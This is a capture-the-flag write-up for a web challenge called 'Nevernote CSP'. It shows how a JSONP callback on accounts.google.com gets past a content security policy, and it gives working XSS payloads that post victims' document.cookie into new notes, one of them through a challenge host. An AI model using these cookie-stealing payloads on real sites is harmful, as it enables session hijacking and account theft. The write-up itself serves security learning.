# Nevernote CSP

### Category: Web
__________________________



Given that the challenge prompt says that the cookie is in the admin's flag, is stands to reason that I'll need to create a note that instantly causes a user to post their cookies.
![Alt text](Images/nevernote4.png)

To start, I used command line injection to test what was allowed in the note content. 

~~~
<script>alert(123)</script>
~~~
gave the following error:
![Alt text](Images/nevernote3.png)

The content security policy (CSP) didn’t allow for inline script from an unknown source, but asp per the CSP rules in the response header, sites like `accounts.google.com` are fair game. This means I could use a callback. Callbacks are essentially functions used as arguments in other functions. By using another function from a trusted website to call our evil function, we effectively bypass the CSP! I crafted the following input:

~~~
<script src="https://accounts.google.com/o/oauth2/revoke?callback=$.ajax({
  type: 'POST',
  url: 'http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new',
  data: {'title': 'GOTCHA', 'content':document.cookie, 'submit':'save'}
});"></script>
~~~
Infuriatingly, this both worked and didn’t work. For all intents and purposes, I achieved my goal: users that see the note involuntarily post their cookie information for all to see, unfortunately, this worked on every account except for the admin! 
![Alt text](Images/nevernote5.png)

>After some digging, it appears that many sites don’t automatically allow admins to run ajax! Who knew?

Finally, a slightly simpler line of code did the trick. 
~~~
<script src="https://accounts.google.com/o/oauth2/revoke?callback=$.post('/note/new', { title: 'suckerz', content: document.cookie } );"></script>
~~~
![Alt text](Images/nevernote1.png)
Instead of ajax, I used post, reported the note, and retrieved the flag.

![Alt text](Images/nevernote2.png)
